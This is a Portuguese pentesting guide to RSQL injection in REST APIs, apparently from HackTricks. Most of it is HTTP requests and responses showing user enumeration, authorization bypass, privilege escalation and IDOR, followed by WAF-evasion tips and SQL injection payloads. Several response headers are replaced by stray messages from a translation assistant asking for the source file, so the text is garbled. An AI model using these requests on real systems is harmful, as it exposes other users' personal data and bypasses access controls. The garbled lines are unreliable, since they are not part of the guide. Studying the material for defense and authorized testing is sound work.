# RSQL Injection

{{#include ../banners/hacktricks-training.md}}

## O que é RSQL?
RSQL é uma linguagem de consulta projetada para filtragem parametrizada de entradas em RESTful APIs. Baseada em FIQL (Feed Item Query Language), originalmente especificada por Mark Nottingham para consulta de Atom feeds, RSQL destaca-se por sua simplicidade e pela capacidade de expressar consultas complexas de forma compacta e compatível com URI via HTTP. Isso a torna uma excelente escolha como linguagem de consulta geral para busca em endpoints REST.

## Visão geral
RSQL Injection é uma vulnerabilidade em aplicações web que usam RSQL como linguagem de consulta em RESTful APIs. Semelhante a [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection) e [LDAP Injection](https://owasp.org/www-community/attacks/LDAP_Injection), essa vulnerabilidade ocorre quando filtros RSQL não são devidamente sanitizados, permitindo que um atacante injete consultas maliciosas para acessar, modificar ou excluir dados sem autorização.

## Como funciona?
RSQL permite construir consultas avançadas em RESTful APIs, por exemplo:
```bash
/products?filter=price>100;category==electronics
```
Isso se traduz em uma consulta estruturada que filtra produtos com price maior que 100 e category “electronics”.

Se a aplicação não validar corretamente a entrada do usuário, um atacante poderia manipular o filtro para executar consultas inesperadas, tais como:
```bash
/products?filter=id=in=(1,2,3);delete_all==true
```
Ou até aproveitar para extrair informações sensíveis com Boolean queries ou nested subqueries.

## Riscos
- **Exposição de dados sensíveis:** Um atacante pode recuperar informações que não deveriam ser acessíveis.
- **Modificação ou exclusão de dados:** Injeção de filtros que alteram registros do banco de dados.
- **Escalada de privilégios:** Manipulação de identificadores que concedem papéis através de filtros para enganar a aplicação e acessar com privilégios de outros usuários.
- **Evasão de controles de acesso:** Manipulação de filtros para acessar dados restritos.
- **Personificação ou IDOR:** Modificação de identificadores entre usuários por meio de filtros que permitem acessar informações e recursos de outros usuários sem estar devidamente autenticado como tal.

## Operadores RSQL suportados
| Operator  | Descrição | Exemplo  |
|:----: |:----: |:------------------:|
| `;` / `and` | Operador lógico **AND**. Filtra linhas onde *ambas* as condições são *verdadeiras* | `/api/v2/myTable?q=columnA==valueA;columnB==valueB` |
| `,` / `or` | Operador lógico **OR**. Filtra linhas onde *pelo menos uma* condição é *verdadeira*| `/api/v2/myTable?q=columnA==valueA,columnB==valueB` |
| `==` | Executa uma consulta de **igualdade**. Retorna todas as linhas de *myTable* onde os valores em *columnA* são exatamente iguais a *queryValue* | `/api/v2/myTable?q=columnA==queryValue` |
| `=q=` | Executa uma consulta de **busca**. Retorna todas as linhas de *myTable* onde os valores em *columnA* contêm *queryValue* | `/api/v2/myTable?q=columnA=q=queryValue` |
| `=like=` | Executa uma consulta do tipo **like**. Retorna todas as linhas de *myTable* onde os valores em *columnA* são parecidos com *queryValue* | `/api/v2/myTable?q=columnA=like=queryValue` |
| `=in=` | Executa uma consulta **in**. Retorna todas as linhas de *myTable* onde *columnA* contém *valueA* OU *valueB* | `/api/v2/myTable?q=columnA=in=(valueA, valueB)` |
| `=out=` | Executa uma consulta de **exclusão**. Retorna todas as linhas de *myTable* onde os valores em *columnA* não são nem *valueA* nem *valueB* | `/api/v2/myTable?q=columnA=out=(valueA,valueB)` |
| `!=` | Executa uma consulta de **diferença**. Retorna todas as linhas de *myTable* onde os valores em *columnA* não são iguais a *queryValue* | `/api/v2/myTable?q=columnA!=queryValue` |
| `=notlike=` | Executa uma consulta de **not like**. Retorna todas as linhas de *myTable* onde os valores em *columnA* não são parecidos com *queryValue* | `/api/v2/myTable?q=columnA=notlike=queryValue` |
| `<` & `=lt=` | Executa uma consulta **menor que**. Retorna todas as linhas de *myTable* onde os valores em *columnA* são inferiores a *queryValue* | `/api/v2/myTable?q=columnA<queryValue` <br> `/api/v2/myTable?q=columnA=lt=queryValue` |
| `=le=` & `<=` | Executa uma consulta **menor que ou igual a**. Retorna todas as linhas de *myTable* onde os valores em *columnA* são menores ou iguais a *queryValue* | `/api/v2/myTable?q=columnA<=queryValue` <br> `/api/v2/myTable?q=columnA=le=queryValue` |
| `>` & `=gt=` | Executa uma consulta **maior que**. Retorna todas as linhas de *myTable* onde os valores em *columnA* são maiores que *queryValue* | `/api/v2/myTable?q=columnA>queryValue` <br> `/api/v2/myTable?q=columnA=gt=queryValue` |
| `>=` & `=ge=` | Executa uma consulta **maior ou igual a**. Retorna todas as linhas de *myTable* onde os valores em *columnA* são iguais ou maiores que *queryValue* | `/api/v2/myTable?q=columnA>=queryValue` <br> `/api/v2/myTable?q=columnA=ge=queryValue` |
| `=rng=` | Executa uma consulta **de–até**. Retorna todas as linhas de *myTable* onde os valores em *columnA* são iguais ou maiores que *fromValue* e menores ou iguais a *toValue* | `/api/v2/myTable?q=columnA=rng=(fromValue,toValue)` |

**Nota**: Tabela baseada nas informações de [**MOLGENIS**](https://molgenis.gitbooks.io/molgenis/content/) e [**rsql-parser**](https://github.com/jirutka/rsql-parser) applications.

#### Exemplos
- name=="Kill Bill";year=gt=2003
- name=="Kill Bill" and year>2003
- genres=in=(sci-fi,action);(director=='Christopher Nolan',actor==*Bale);year=ge=2000
- genres=in=(sci-fi,action) and (director=='Christopher Nolan' or actor==*Bale) and year>=2000
- director.lastName==Nolan;year=ge=2000;year=lt=2010
- director.lastName==Nolan and year>=2000 and year<2010
- genres=in=(sci-fi,action);genres=out=(romance,animated,horror),director==Que*Tarantino
- genres=in=(sci-fi,action) and genres=out=(romance,animated,horror) or director==Que*Tarantino

**Nota**: Tabela baseada nas informações de [**rsql-parser**](https://github.com/jirutka/rsql-parser) application.

## Filtros comuns
Estes filtros ajudam a refinar consultas em APIs:

| Filter | Descrição | Exemplo |
|--------|------------|---------|
| `filter[users]` | Filtra resultados por usuários específicos | `/api/v2/myTable?filter[users]=123` |
| `filter[status]` | Filtra por status (ativo/inativo, concluído, etc.) | `/api/v2/orders?filter[status]=active` |
| `filter[date]` | Filtra resultados dentro de um intervalo de datas | `/api/v2/logs?filter[date]=gte:2024-01-01` |
| `filter[category]` | Filtra por categoria ou tipo de recurso | `/api/v2/products?filter[category]=electronics` |
| `filter[id]` | Filtra por um identificador único | `/api/v2/posts?filter[id]=42` |


## Parâmetros comuns
Estes parâmetros ajudam a otimizar respostas de APIs:

| Parâmetro | Descrição | Exemplo |
|-----------|------------|---------|
| `include` | Inclui recursos relacionados na resposta | `/api/v2/orders?include=customer,items` |
| `sort` | Ordena resultados em ordem ascendente ou descendente | `/api/v2/users?sort=-created_at` |
| `page[size]` | Controla o número de resultados por página | `/api/v2/products?page[size]=10` |
| `page[number]` | Especifica o número da página | `/api/v2/products?page[number]=2` |
| `fields[resource]` | Define quais campos retornar na resposta | `/api/v2/users?fields[users]=id,name,email` |
| `search` | Executa uma busca mais flexível | `/api/v2/posts?search=technology` |

## Vazamento de informação e enumeração de usuários
A requisição a seguir mostra um endpoint de registro que exige o parâmetro email para verificar se existe algum usuário registrado com esse email e retornar true ou false dependendo se ele existe ou não no banco de dados:
### Requisição
```
GET /api/registrations HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
Por favor cole o conteúdo do arquivo src/pentesting-web/rsql-injection.md que você quer que eu traduza para português. Observação: seguirei suas instruções — não traduzo código, nomes de técnicas, tags, links ou paths.
```
HTTP/1.1 400
Date: Sat, 22 Mar 2025 14:47:14 GMT
Content-Type: application/vnd.api+json
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *
Content-Length: 85

{
"errors": [{
"code": "BLANK",
"detail": "Missing required param: email",
"status": "400"
}]
}
```
### Requisição

Embora um `/api/registrations?email=<emailAccount>` seja o esperado, é possível usar filtros RSQL para tentar enumerar e/ou extrair informações de usuários através do uso de operadores especiais:
```
GET /api/registrations?filter[userAccounts]=email=='test@test.com' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Origin: https://locahost:3000
Connection: keep-alive
Referer: https://locahost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
Por favor, cole o conteúdo do arquivo src/pentesting-web/rsql-injection.md aqui para que eu possa traduzir para português mantendo exatamente a mesma marcação (markdown/html) e sem traduzir código, tags, links, paths ou termos técnicos conforme suas instruções.
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 14:09:38 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 38
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": {
"attributes": {
"tenants": []
}
}
}
```
No caso de corresponder a uma conta de e-mail válida, a aplicação retornaria as informações do usuário em vez de um clássico *“true”*, *"1"* ou algo assim na resposta ao servidor:
### Request
```
GET /api/registrations?filter[userAccounts]=email=='manuel**********@domain.local' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
Por favor, cole o conteúdo do arquivo src/pentesting-web/rsql-injection.md que você quer que eu traduza. Sem o texto não consigo fazer a tradução.
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 14:19:46 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 293
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": {
"id": "********************",
"type": "UserAccountDTO",
"attributes": {
"id": "********************",
"type": "UserAccountDTO",
"email": "manuel**********@domain.local",
"sub": "*********************",
"status": "ACTIVE",
"tenants": [{
"id": "1"
}]
}
}
}
```
## Authorization evasion
Neste cenário, partimos de um usuário com uma função básica e no qual não temos permissões privilegiadas (por exemplo, administrator) para acessar a lista de todos os usuários cadastrados no banco de dados:
### Requisição
```
GET /api/users HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJhb.................
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### Response
```
HTTP/1.1 403
Date: Sat, 22 Mar 2025 14:40:07 GMT
Content-Length: 0
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *
```
Novamente, fazemos uso dos filtros e operadores especiais que nos permitem uma forma alternativa de obter as informações dos usuários e contornar o controle de acesso.
Por exemplo, filtrar pelos *usuários* que contenham a letra “*a*” em seu *ID* de usuário:
### Request
```
GET /api/users?filter[users]=id=in=(*a*) HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJhb.................
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
Você não incluiu o conteúdo do arquivo src/pentesting-web/rsql-injection.md. Por favor, cole o conteúdo (ou envie o trecho a ser traduzido) para que eu possa traduzir para o português mantendo exatamente a mesma sintaxe Markdown/HTML e as instruções de não tradução indicadas.
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 14:43:28 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 1434192
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": [{
"id": "********A***********",
"type": "UserGetResponseCustomDTO",
"attributes": {
"status": "ACTIVE",
"countryId": 63,
"timeZoneId": 3,
"translationKey": "************",
"email": "**********@domain.local",
"firstName": "rafael",
"surname": "************",
"telephoneCountryCode": "**",
"mobilePhone": "*********",
"taxIdentifier": "********",
"languageId": 1,
"createdAt": "2024-08-09T10:57:41.237Z",
"termsOfUseAccepted": true,
"id": "******************",
"type": "UserGetResponseCustomDTO"
}
}, {
"id": "*A*******A*****A*******A******",
"type": "UserGetResponseCustomDTO",
"attributes": {
"status": "ACTIVE",
"countryId": 63,
"timeZoneId": 3,
"translationKey": ""************",
"email": "juan*******@domain.local",
"firstName": "juan",
"surname": ""************",",
"telephoneCountryCode": "**",
"mobilePhone": "************",
"taxIdentifier": "************",
"languageId": 1,
"createdAt": "2024-07-18T06:07:37.68Z",
"termsOfUseAccepted": true,
"id": "*******************",
"type": "UserGetResponseCustomDTO"
}
}, {
................
```
## Privilege Escalation
É muito provável encontrar certos endpoints que verificam os privilégios do usuário através do seu role. Por exemplo, estamos lidando com um usuário que não tem privilégios:
### Request
```
GET /api/companyUsers?include=role HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJhb......
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
Não recebi o conteúdo do arquivo src/pentesting-web/rsql-injection.md. Por favor cole aqui o texto que deseja que eu traduza para português (manterei a sintaxe markdown/html e não traduzirei código, nomes técnicos, links, paths ou tags conforme suas instruções).
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 19:13:08 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 11
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": []
}
```
Usando certos operadores, poderíamos enumerar usuários administradores:
### Request
```
GET /api/companyUsers?include=role&filter[companyUsers]=user.id=='94****************************' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJh.....
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
Por favor envie o conteúdo do arquivo src/pentesting-web/rsql-injection.md para que eu possa traduzi-lo conforme as instruções.
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 19:13:45 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 361
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": [{
"type": "CompanyUserGetResponseDTO",
"attributes": {
"companyId": "FA**************",
"companyTaxIdentifier": "B999*******",
"bizName": "company sl",
"email": "jose*******@domain.local",
"userRole": {
"userRoleId": 1,
"userRoleKey": "general.roles.admin"
},
"companyCountryTranslationKey": "*******",
"type": "CompanyUserGetResponseDTO"
}
}]
}
```
Após conhecer o identificador de um usuário administrador, seria possível explorar uma escalada de privilégios substituindo ou adicionando o filtro correspondente com o identificador do administrador e obtendo os mesmos privilégios:
### Request
```
GET /api/functionalities/allPermissionsFunctionalities?filter[companyUsers]=user.id=='94****************************' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJ.....
Origin: https:/localhost:3000
Connection: keep-alive
Referer: https:/localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### Resposta
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 18:53:00 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 68833
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"meta": {
"Functionalities": [{
"functionalityId": 1,
"permissionId": 1,
"effectivePriority": "PERMIT",
"effectiveBehavior": "PERMIT",
"translationKey": "general.userProfile",
"type": "FunctionalityPermissionDTO"
}, {
"functionalityId": 2,
"permissionId": 2,
"effectivePriority": "PERMIT",
"effectiveBehavior": "PERMIT",
"translationKey": "general.my_profile",
"type": "FunctionalityPermissionDTO"
}, {
"functionalityId": 3,
"permissionId": 3,
"effectivePriority": "PERMIT",
"effectiveBehavior": "PERMIT",
"translationKey": "layout.change_user_data",
"type": "FunctionalityPermissionDTO"
}, {
"functionalityId": 4,
"permissionId": 4,
"effectivePriority": "PERMIT",
"effectiveBehavior": "PERMIT",
"translationKey": "general.configuration",
"type": "FunctionalityPermissionDTO"
}, {
....
}]
}
}
```
## Impersonate or Insecure Direct Object References (IDOR)
Além do uso do parâmetro `filter`, é possível usar outros parâmetros como `include`, que permite incluir no resultado certos parâmetros (por exemplo, language, country, password...).

No exemplo a seguir, são exibidas as informações do nosso perfil de usuário:
### Requisição
```
GET /api/users?include=language,country HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJ...
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
Por favor, cole o conteúdo do arquivo src/pentesting-web/rsql-injection.md (ou indique o trecho específico) que deseja que eu traduza para português. Sem o conteúdo não consigo fazer a tradução.
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 19:47:27 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 540
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": [{
"id": "D5********************",
"type": "UserGetResponseCustomDTO",
"attributes": {
"status": "ACTIVE",
"countryId": 63,
"timeZoneId": 3,
"translationKey": "**********",
"email": "domingo....@domain.local",
"firstName": "Domingo",
"surname": "**********",
"telephoneCountryCode": "**",
"mobilePhone": "******",
"languageId": 1,
"createdAt": "2024-03-11T07:24:57.627Z",
"termsOfUseAccepted": true,
"howMeetUs": "**************",
"id": "D5********************",
"type": "UserGetResponseCustomDTO"
}
}]
}
```
A combinação de filtros pode ser usada para contornar o controle de autorização e obter acesso aos perfis de outros usuários:
### Requisição
```
GET /api/users?include=language,country&filter[users]=id=='94***************' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJ...
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### Response
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 19:50:07 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 520
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": [{
"id": "94******************",
"type": "UserGetResponseCustomDTO",
"attributes": {
"status": "ACTIVE",
"countryId": 63,
"timeZoneId": 2,
"translationKey": "**************",
"email": "jose******@domain.local",
"firstName": "jose",
"surname": "***************",
"telephoneCountryCode": "**",
"mobilePhone": "********",
"taxIdentifier": "*********",
"languageId": 1,
"createdAt": "2024-11-21T08:29:05.833Z",
"termsOfUseAccepted": true,
"id": "94******************",
"type": "UserGetResponseCustomDTO"
}
}]
}
```
## Detecção & fuzzing — ganhos rápidos
- Verifique suporte a RSQL enviando sondas inofensivas como `?filter=id==test`, `?q==test` ou operadores malformados `=foo=`; APIs verbosas frequentemente leak parser errors ("Unknown operator" / "Unknown property").
- Muitas implementações analisam os parâmetros de URL duas vezes; experimente dupla codificação de `(`, `)`, `*`, `;` (ex.: `%2528admin%2529`) para contornar blocklists ingênuas e WAFs.
- Exfiltração booleana com wildcards: `filter[users]=email==*%@example.com;status==ACTIVE` e inverta a lógica com `,` (OR) para comparar tamanhos de resposta.
- Range/proximity leaks: `filter[users]=createdAt=rng=(2024-01-01,2025-01-01)` enumera rapidamente por ano sem precisar conhecer IDs exatos.

## Abuso específico por framework (Elide / JPA Specification / JSON:API)
- Elide e muitos projetos Spring Data REST traduzem RSQL diretamente para JPA Criteria. Quando desenvolvedores adicionam operadores customizados (ex.: `=ilike=`) e constroem predicates via concatenação de strings em vez de parâmetros preparados, você pode pivotar para SQLi (payload clássico: `name=ilike='%%' OR 1=1--'`).
- Elide analytic data store aceita colunas parametrizadas; combinar parâmetros analíticos controlados pelo usuário com filtros RSQL foi a causa raiz do SQLi no CVE-2022-24827. Mesmo que versões corrigidas parametrizem corretamente, código bespoke semelhante muitas vezes permanece — procure por expressões SpEL `@JoinFilter`/`@ReadPermission` contendo `${}` e tente injetar `';sleep(5);'` ou tautologias lógicas.
- Backends JSON:API comumente expõem tanto `include` quanto `filter`. Filtrar recursos relacionados com `filter[orders]=customer.email==*admin*` pode contornar ACLs de topo porque filtros ao nível de relação executam antes das checagens de propriedade.

## Auxiliares de automação
- **rsql-parser CLI (Java)**: `java -jar rsql-parser.jar "name=='*admin*';status==ACTIVE"` valida payloads localmente e mostra a árvore de sintaxe abstrata — útil para criar parênteses balanceados e operadores customizados.
- **Construtor rápido em Python**:
```python
from pyrsql import RSQL
payload = RSQL().and_("email==*admin*", "status==ACTIVE").or_("role=in=(owner,admin)")
print(str(payload))
```
- Combine com HTTP fuzzer (ffuf, turbo-intruder) iterando wildcard positions `*a*`, `*e*`, etc., dentro de listas `=in=` para enumerar IDs e emails rapidamente.

## Referências
- [RSQL Injection](https://owasp.org/www-community/attacks/RSQL_Injection)
- [RSQL Injection Exploitation](https://m3n0sd0n4ld.github.io/patoHackventuras/rsql_injection_exploitation)
- [Elide filtering & security considerations](https://elide.io/pages/guide/03-analytics.html)

{{#include ../banners/hacktricks-training.md}}
